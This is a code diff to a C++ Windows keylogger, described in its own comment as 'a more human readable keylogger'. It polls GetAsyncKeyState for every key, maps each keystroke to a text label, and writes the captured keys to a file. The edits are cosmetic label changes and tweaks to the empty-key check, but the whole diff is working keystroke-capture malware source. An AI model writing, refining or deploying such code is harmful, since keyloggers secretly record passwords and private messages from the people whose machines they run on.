@@ -7,7 +7,7 @@
 // a more human readable keylogger
 bool clean = true;
 
-bool isShift() { return (((1 << 15 ) & GetAsyncKeyState(VK_SHIFT)) ? true : false); }
+bool isShift() { return (((1 << 15) & GetAsyncKeyState(VK_SHIFT)) ? true : false); }
 
 const char* CaptureKeyPress(const int& key, const bool& clean) {
 	
@@ -74,36 +74,39 @@ const char* CaptureKeyPress(const int& key, const bool& clean) {
 		case VK_SCROLL:  { return "[LOCK_SCR]"; break; }
 		case VK_CAPITAL: { return "[LOCK_CAP]"; break; }
 		
-		////shift
-		//case VK_SHIFT:  { return "[SHIFT]";  break; }
-		//case VK_LSHIFT: { return "[LSHIFT]"; break; }
-		//case VK_RSHIFT: { return "[RSHIFT]"; break; }
+		/*
+		//shift
+		case VK_SHIFT:  { return "[SHIFT]";  break; }
+		case VK_LSHIFT: { return "[LSHIFT]"; break; }
+		case VK_RSHIFT: { return "[RSHIFT]"; break; }
+		/**/
 		
-	    case VK_LCONTROL: { return "[LCONTROL]"; break; }
-		case VK_RCONTROL: { return "[RCONTROL]"; break; }
-		case VK_TAB:      { return "[TAB]";      break; }
-		case VK_MENU:     { return "[ALT]";      break; }
+	    case VK_LCONTROL: { return "[LCTRL]"; break; }
+		case VK_RCONTROL: { return "[RCTRL]"; break; }
+		case VK_TAB:      { return "[TAB]";   break; }
+		case VK_LMENU:    { return "[LALT]";  break; }
+		case VK_RMENU:    { return "[RALT]";  break; }
 		
 		case VK_LWIN: { return "[LWIN]"; break; }
 		case VK_RWIN: { return "[RWIN]"; break; }
 		
-		case VK_NUMPAD0:  { return "[NUM0]"; break; }
-		case VK_NUMPAD1:  { return "[NUM1]"; break; }
-		case VK_NUMPAD2:  { return "[NUM2]"; break; }
-		case VK_NUMPAD3:  { return "[NUM3]"; break; }
-		case VK_NUMPAD4:  { return "[NUM4]"; break; }
-		case VK_NUMPAD5:  { return "[NUM5]"; break; }
-		case VK_NUMPAD6:  { return "[NUM6]"; break; }
-		case VK_NUMPAD7:  { return "[NUM7]"; break; }
-		case VK_NUMPAD8:  { return "[NUM8]"; break; }
-		case VK_NUMPAD9:  { return "[NUM9]"; break; }
+		case VK_NUMPAD0:  { return "[N0]"; break; }
+		case VK_NUMPAD1:  { return "[N1]"; break; }
+		case VK_NUMPAD2:  { return "[N2]"; break; }
+		case VK_NUMPAD3:  { return "[N3]"; break; }
+		case VK_NUMPAD4:  { return "[N4]"; break; }
+		case VK_NUMPAD5:  { return "[N5]"; break; }
+		case VK_NUMPAD6:  { return "[N6]"; break; }
+		case VK_NUMPAD7:  { return "[N7]"; break; }
+		case VK_NUMPAD8:  { return "[N8]"; break; }
+		case VK_NUMPAD9:  { return "[N9]"; break; }
 		
-		case VK_UP:    { return (clean ? "" : "[ARROW_UP]"   ); break; } 
-		case VK_DOWN:  { return (clean ? "" : "[ARROW_DOWN]" ); break; }
-		case VK_LEFT:  { return (clean ? "" : "[ARROW_LEFT]" ); break; }
-		case VK_RIGHT: { return (clean ? "" : "[ARROW_RIGHT]"); break; }
-		case VK_NEXT:  { return (clean ? "" : "[PG_UP]"      ); break; }
-		case VK_PRIOR: { return (clean ? "" : "[PG_DOWN]"    ); break; }
+		case VK_UP:    { return (clean ? "" : "[UP]"   ); break; } 
+		case VK_DOWN:  { return (clean ? "" : "[DOWN]" ); break; }
+		case VK_LEFT:  { return (clean ? "" : "[LEFT]" ); break; }
+		case VK_RIGHT: { return (clean ? "" : "[RIGHT]"); break; }
+		case VK_NEXT:  { return (clean ? "" : "[NEXT]" ); break; }
+		case VK_PRIOR: { return (clean ? "" : "[PRIOR]"); break; }
 		
 		case VK_HOME:  { return "[HOME]"; break; }
 		case VK_END:   { return "[END]" ; break; }
@@ -139,15 +142,16 @@ const char* CaptureKeyPress(const int& key, const bool& clean) {
         case VK_F23: { return "[F23]"; break; }
         case VK_F24: { return "[F24]"; break; }
 		
-		case VK_SNAPSHOT: { return "[PrntScr]"; break; }
-		case VK_PAUSE:    { return "[PAUSE]";   break; }
-		case VK_INSERT:   { return "[INSERT]";  break; }
-		case VK_DELETE:   { return "[DELETE]";  break; }
-		case VK_SLEEP:    { return "[SLEEP]";   break; }
+		case VK_SNAPSHOT: { return "[PRTSC]";  break; }
+		case VK_PAUSE:    { return "[PAUSE]";  break; }
+		case VK_INSERT:   { return "[INSERT]"; break; }
+		case VK_DELETE:   { return "[DEL]";    break; }
+		case VK_SLEEP:    { return "[SLEEP]";  break; }
 	}
 	
-	return "[NULL]";
+	return "";
 }
+
 
 int main(int argc, char* argv[]) {
 	
@@ -165,7 +169,7 @@ int main(int argc, char* argv[]) {
 			if (GetAsyncKeyState(i) == -32767) {
 				
 				const char* key = CaptureKeyPress(i, clean);
-				if (!strcmp(key, "[NULL]")) { continue; }
+				if (!strcmp(key, "")) { continue; }
 				
 				printf("%s", key);
 				fprintf(f, key);
